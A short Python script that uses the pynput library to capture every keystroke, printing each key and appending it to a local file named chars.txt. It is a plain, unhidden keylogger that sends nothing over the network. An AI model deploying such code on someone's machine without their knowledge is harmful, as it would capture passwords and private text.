from pynput import keyboard

def append_txt(key):
    with open("chars.txt", "a") as file:
        try:
            file.write(key.char)  # Write normal characters
        except AttributeError:
            # For special keys, write their name in brackets (optional)
            file.write(f"[{key.name}]")

def on_press(key):
    try:
        print(f"Key {key.char} pressed")
        append_txt(key)  # Call to write the character to file
    except AttributeError:
        print(f"Special key {key} pressed")
        append_txt(key)  # Optional: write special key names as well

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

